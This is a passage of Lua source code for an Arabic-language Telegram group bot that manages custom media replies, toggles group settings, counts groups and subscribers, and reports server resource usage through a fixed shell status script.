database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id..'List:Rd:Sudo')
end
send(msg.chat_id_, msg.id_,"܁༯┆تم مسح ردود المطور↝ ܰ ")
end

if text == ("ردود المطور") and SudoBot(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n٭ 𖤓┆قائمة ردود المطور ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = 'متحركه 🎭'
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = 'بصمه 📢'
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = 'ملصق 🃏'
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = 'رساله ✉'
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = 'صوره 🎇'
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = 'فيديو 📹'
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = 'ملف 📁'
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = 'اغنيه 🎵'
end
text = text.."𖠵 "..k.." ܊  "..v..". ◃ "..db.."  .\n"
end
if #list == 0 then
text = "܁༯┆لايوجد ردود للمطور ↝ ܰ "
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_)
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,'܁༯┆تم حفظ الرد بنجاح ↝ ܰ ')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'܁༯┆ارسل الرد الذي تريده ↝ ܰ\n܁༯┆سواء كان ▿\n܁༯┆[صوره](t.me/R_IQ9) ܊ [بصمه](t.me/R_IQ9) ܊ [فيد](t.me/R_IQ9) ܊ [متحركه](t.me/R_IQ9) ܊ [ملصق](t.me/R_IQ9) ܰ')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_, 'true1')
database:set(bot_id..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:sadd(bot_id..'List:Rd:Sudo', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'܁༯┆تم حذف الرد بنجاح ↝ ܰ ')
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..v..text)
end
database:del(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Rd:Sudo', text)
return false
end
end
if text == 'اضف رد للكل' and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ارسل الكلمة الذي تريد اضافتها ↝ ܰ')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد للكل' and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ارسل الكلمة الذي تريد حذفها ↝ ܰ')
database:set(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text and not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Add:Rd:Sudo:stekr"..text)     
local text1 = database:get(bot_id.."Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)
------------------------------------------------------------------------
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_,text1)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
if text == ("مسح ردود المدير") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id..'List:Manager'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"܁༯┆ تم مسح ردود المدير ↝ ܰ")
end

if text == ("ردود المدير") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = "٭ 𖤓┆قائمة ردود المدير ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = 'متحركه 🎭'
elseif database:get(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = 'بصمه 📢'
elseif database:get(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = 'ملصق 🃏'
elseif database:get(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = 'رساله ✉'
elseif database:get(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = 'صوره 🎇'
elseif database:get(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = 'فيديو 🎬'
elseif database:get(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_) then
db = 'ملف 📁'
elseif database:get(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = 'اغنيه 🎵'
end
text = text.."܁ 𖠵 "..k.." ܊  "..v.." ◃  "..db.." \n"
end
if #list == 0 then
text = "܁༯┆لايوجد ردود للمدير ↝ ܰ"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Manager'..msg.sender_user_id_..':'..msg.chat_id_..'')
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,'܁༯┆تم حفض الرد بنجاح ↝ ܰ')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'܁༯┆ارسل الرد الذي تريده ↝ ܰ\n܁༯┆سواء كان ▿\n܁༯┆[صوره](t.me/R_IQ9) ܊ [بصمه](t.me/R_IQ9) ܊ [فيد](t.me/R_IQ9) ܊ [متحركه](t.me/R_IQ9) ܊ [ملصق](t.me/R_IQ9) ܰ')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true1')
database:set(bot_id..'Text:Manager'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_..'') == 'true2' then
send(msg.chat_id_, msg.id_,'܁༯┆تم حذف الرد بنجاح ↝ ܰ ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false
end
end
if text == 'اضف رد' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆ارسل الكلمة الذي تريد اضافتها ↝ ܰ')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
send(msg.chat_id_, msg.id_,'܁༯┆ارسل الكلمةه التي تريد حذفها ↝ ܰ ')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true2')
return false 
end
if text and not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local text1 = database:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
------------------------------------------------------------------------
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_, text1)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, anemi)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,photo_caption)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'اسو').." غادر" or text == 'غادر' then  
if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,'܁༯┆باي راح اشتاقلكم 😭↝ ܰ ') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'اسو')
send(msg.chat_id_, msg.id_,'أسمي اللطيف '..Namebot..' . 𖤐◟') 
end
if text == 'الاحصائيات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '┐ عدد المجموعات ◃ ◞*'..Groups..'*◜ \n✛ ٭                  ٭ \n┘ عدد المشتركيين ◃ ◞*'..Users..'*◜ .'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'المجموعات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n٭ 𖡹 ┆عدد المجموعات ◃ ◞ *'..Groups..'* ◜.'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'المشتركين' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n٭ 𖡹 ┆عدد المشتركيين ◃ ◞ *'..Users..'* ◜.'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'تفعيل المغادره' and SudoBot(msg) then   
if database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = '܁༯┆تم تفعيل مغادرة البوت ↝ ܰ'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = '܁༯┆تم تفعيل مغادرة البوت ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and SudoBot(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = '܁༯┆تم تعطيل مغادرة البوت ↝ ܰ'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = '܁༯┆تم تعطيل مغادرة البوت ↝ ܰ'
end
send(msg.chat_id_, msg.id_, Text) 
end

if text == 'تفعيل ردود المدير' and Manager(msg) then   
if database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل ردود المدير ?? ܰ'
database:del(bot_id..'Reply:Manager'..msg.chat_id_)  
else
Text = '܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل ردود المدير ↝ ܰر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ردود المدير' and Manager(msg) then  
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
database:set(bot_id..'Reply:Manager'..msg.chat_id_,true)  
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل ردود المدير ↝ ܰر' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل ردود المدير ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل ردود المطور' and Manager(msg) then   
if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل ردود المطور ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل ردود المطور ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ردود المطور' and Manager(msg) then  
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل ردود المطور ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل ردود المطور ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'تفعيل الايدي' and Manager(msg) then   
if database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id'..msg.chat_id_) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الايدي ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الايدي ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id'..msg.chat_id_,true) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الايدي ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الايدي ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'السيرفر' and SudoBot(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '܁༯┆مدة تشغيل السيرفر ▾ .\n*▸  '"$linux_version"'*' 
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆الذاكره العشوائية ▾ .\n*▸ '"$memUsedPrc"'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆وحدة التخزين ▾ .\n*▸ '"$HardDisk"'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆المعالج ▾ .\n*▸ '"`grep -c processor /proc/cpuinfo`""Core ▸ $CPUPer% "'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆الدخول ▾ . \n*▸ '`whoami`'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆مدة تشغيل السيرفر ▾ .\n*▸ '"$uptime"'*'
]]):read('*all'))  
end

if text == 'تفعيل الايدي بالصوره' and Manager(msg) then   
if database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الايدي بالصوره ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الايدي بالصوره ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي بالصوره' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الايدي بالصوره ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الايدي بالصوره ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الحظر' and Constructor(msg) then   
if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:del(bot_id..'Lock:kick'..msg.chat_id_) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الحظر ↝ ܰ ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل الحظر ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الحظر' and Constructor(msg) then  
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الحظر ↝ ܰ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل الحظر ↝ ܰ'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الرفع' and Constructor(msg) then   
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر الرفع ↝ ܰ ' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تفعيل امر الرفع ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الرفع' and Constructor(msg) then  
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر الرفع ↝ ܰع' 
else
Text = '\n܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم تعطيل امر الرفع ↝ ܰع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_user_id_) or 0)
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
